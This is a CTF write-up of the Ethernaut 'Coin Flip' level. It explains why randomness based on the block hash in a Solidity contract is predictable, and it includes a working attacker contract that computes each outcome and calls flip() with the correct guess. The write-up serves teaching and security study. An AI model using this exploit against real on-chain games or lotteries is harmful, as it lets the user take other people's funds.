# Coin Flip

To complete this level we will have to guess the correct outcome of the coin flip 10 times in a row.

## Code Breakdown

[The Smart Contract's Code can be seen here.](CoinFlip.sol)

```solidity
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
```

This contract's has 3 uint256 variables:

- consecutiveWins: public variable, this will keep track of our current streak of correct guesses.
- lastHash: internal variable, this will keep track of the last calculated "hash"
- FACTOR: internal variable, a big number that will be used in calculating the outcome of the coin flip.

```solidity
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```
This contract only consists of one main function `flip()`. It determines the outcome of a **pseudo-random** coinflip with the help of the latest `block number` hash, using the following formula that generates either 1 or 0: 
```solidity
uint256(blockhash(block.number - 1)) / FACTOR;
```
Another important check that we can notice is this condition:
```solidity
if (lastHash == blockValue) {
      revert();
    }
```
This checks keeps track of the latest hash calculated and reverts if identical. This will stop us from sending 10 transactions at a time in the same block with the same guess and getting them all correct.

### The problem with randomness in the blockchain 

Generating random numbers in solidity can be tricky.
One of the popular means of achieving on-chain randomness is `Block-hashing`, at first it seems that the coinflip is indeed random but since blockchain data is public and the hashes are deterministic, everyone gets to see the block number and calculate the same hash, malicious miners can even modify block headers or choose not to publish blocks in order to influence the resulting hashes.

To get cryptographically proven random numbers, you can use [Chainlink VRF](https://docs.chain.link/vrf/v2/subscription/examples/get-a-random-number) or other solutions such as [RANDAO](https://github.com/randao/randao), [provable.xyz](https://provable.xyz/)

### Level Completion

We can get the block number and hash from console using [web3.eth.getBlock](https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#getblock) :
```js
>  (await web3.eth.getBlock()).hash
<· "0x5820215401f0405a39d3a4e1a33eadb46ec4ff30fa3649d004d465c5b69c1db6"
```
but trying to calculate the coinflip then calling `flip()` from our console using web3js will not work consistently because the transactions may take multiple blocks to be confirmed and mined. This will cause our blockhash to be outdated.

We will create a minimalistic smart contract that mimics the same logic and make it call `flip()` with the correct guess.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlipHack {
    //address of the deployed game instance
    address addr = 0x7D35C1ecb804b7ac13D13DC8E0362B208b1478Cd;

    function hack() public returns (bool){
        CoinFlip cf = CoinFlip(addr);
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        return cf.flip(side); // call to flip() function.
    }
}

// We need to define the game instance interface so we can call its functions from our smart contract

interface CoinFlip {
    function flip(bool _guess) external returns (bool); 
}
```
We can now compile, deploy and interact with our smart contract using [Remix IDE](https://remix.ethereum.org/), then calling the `hack()` function 10 times.